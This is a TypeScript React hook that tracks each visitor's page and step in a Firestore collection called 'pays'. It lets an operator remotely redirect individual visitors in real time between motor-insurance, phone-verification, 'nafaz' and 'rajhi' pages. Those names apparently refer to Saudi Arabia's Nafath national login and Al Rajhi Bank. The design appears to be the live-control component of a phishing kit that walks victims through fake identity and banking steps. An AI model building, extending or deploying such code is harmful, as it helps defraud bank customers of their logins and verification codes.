import { useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot, updateDoc, deleteField } from "firebase/firestore";

export type RoutablePage = "motor" | "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";

export interface AdminDirective {
  targetPage?: RoutablePage;
  targetStep?: number;
  issuedAt?: string;
  issuedBy?: string;
}

export interface VisitorData {
  adminDirective?: AdminDirective;
  currentPage?: string;
  currentStep?: number;
}

const PAGE_ROUTES: Record<string, string> = {
  "motor": "/motor",
  "motor-insurance": "/motor",
  "phone-verification": "/phone",
  "nafaz": "/nafaz",
  "rajhi": "/rajhi",
  "done": "/motor",
};

const normalizePageName = (page: string): RoutablePage => {
  if (page.startsWith("motor-insurance") || page === "motor") return "motor";
  if (page.startsWith("phone")) return "phone-verification";
  if (page.startsWith("nafaz")) return "nafaz";
  if (page.startsWith("rajhi")) return "rajhi";
  return "motor";
};

const getRouteForPage = (page: string): string | undefined => {
  return PAGE_ROUTES[page] || PAGE_ROUTES[normalizePageName(page)];
};

interface UseVisitorRoutingOptions {
  currentPage: RoutablePage;
  currentStep?: number;
  firestorePageName?: string;
  onStepChange?: (step: number) => void;
}

export function useVisitorRouting({
  currentPage,
  currentStep,
  firestorePageName,
  onStepChange,
}: UseVisitorRoutingOptions) {
  const [location, setLocation] = useLocation();
  const processedDirectivesRef = useRef<Set<string>>(new Set());
  const writingRef = useRef(false);
  const pendingDirectiveRef = useRef<{ directive: AdminDirective; key: string } | null>(null);

  const getVisitorId = useCallback((): string => {
    if (typeof sessionStorage === "undefined") return "";
    
    let visitorId = sessionStorage.getItem("visitor");
    if (!visitorId) {
      visitorId = generateVisitorId();
      sessionStorage.setItem("visitor", visitorId);
    }
    return visitorId;
  }, []);

  const visitorId = getVisitorId();

  const updateVisitorState = useCallback(async (page: string, step?: number) => {
    if (!visitorId || writingRef.current) return;
    
    writingRef.current = true;
    
    const updatePayload: any = {
      id: visitorId,
      currentPage: page,
    };
    if (step !== undefined) {
      updatePayload.currentStep = step;
    }
    try {
      await addData(updatePayload);
    } finally {
      writingRef.current = false;
    }
  }, [visitorId]);

  useEffect(() => {
    const pending = pendingDirectiveRef.current;
    if (pending && normalizePageName(pending.directive.targetPage || "") === currentPage) {
      const { directive, key } = pending;
      
      if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
        onStepChange(directive.targetStep);
      }
      
      processedDirectivesRef.current.add(key);
      pendingDirectiveRef.current = null;

      if (visitorId && db) {
        const docRef = doc(db, "pays", visitorId);
        updateDoc(docRef, { adminDirective: deleteField() }).catch(() => {});
      }
    }
  }, [currentPage, currentStep, onStepChange, visitorId]);

  const currentPageRef = useRef(currentPage);
  const currentStepRef = useRef(currentStep);
  const onStepChangeRef = useRef(onStepChange);
  const locationRef = useRef(location);

  useEffect(() => { currentPageRef.current = currentPage; }, [currentPage]);
  useEffect(() => { currentStepRef.current = currentStep; }, [currentStep]);
  useEffect(() => { onStepChangeRef.current = onStepChange; }, [onStepChange]);
  useEffect(() => { locationRef.current = location; }, [location]);

  useEffect(() => {
    if (!visitorId || !db || !isFirebaseConfigured) return;

    const docRef = doc(db, "pays", visitorId);
    
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (!docSnap.exists()) return;
      
      const data = docSnap.data() as VisitorData;
      const directive = data.adminDirective;
      const page = currentPageRef.current;
      const step = currentStepRef.current;
      const loc = locationRef.current;
      const stepCb = onStepChangeRef.current;
      
      if (directive && directive.targetPage) {
        const normalizedTarget = normalizePageName(directive.targetPage);
        const directiveKey = `${directive.targetPage}-${directive.targetStep}-${directive.issuedAt}`;
        
        if (!processedDirectivesRef.current.has(directiveKey)) {
          if (normalizedTarget !== page) {
            pendingDirectiveRef.current = { directive, key: directiveKey };
            
            const targetRoute = getRouteForPage(directive.targetPage);
            if (targetRoute && loc !== targetRoute) {
              setLocation(targetRoute);
            }
          } else {
            processedDirectivesRef.current.add(directiveKey);
            
            if (directive.targetStep !== undefined && directive.targetStep !== step && stepCb) {
              stepCb(directive.targetStep);
            }
            
            if (visitorId && db) {
              const clearRef = doc(db, "pays", visitorId);
              updateDoc(clearRef, { adminDirective: deleteField() }).catch(() => {});
            }
          }
          return;
        }
      }
    }, (error) => {
      console.error("Error listening to visitor routing:", error);
    });

    return () => unsubscribe();
  }, [visitorId, setLocation]);

  const lastSentRef = useRef<string>("");

  useEffect(() => {
    if (!visitorId || !currentPage) return;
    const pageName = firestorePageName || currentPage;
    const normalizedStep = currentStep ?? 0;
    const key = `${pageName}:${normalizedStep}`;
    
    if (lastSentRef.current === key) return;
    lastSentRef.current = key;
    
    updateVisitorState(pageName, currentStep);
  }, [visitorId, currentPage, currentStep, firestorePageName, updateVisitorState]);

  return {
    visitorId,
    updateVisitorState,
  };
}
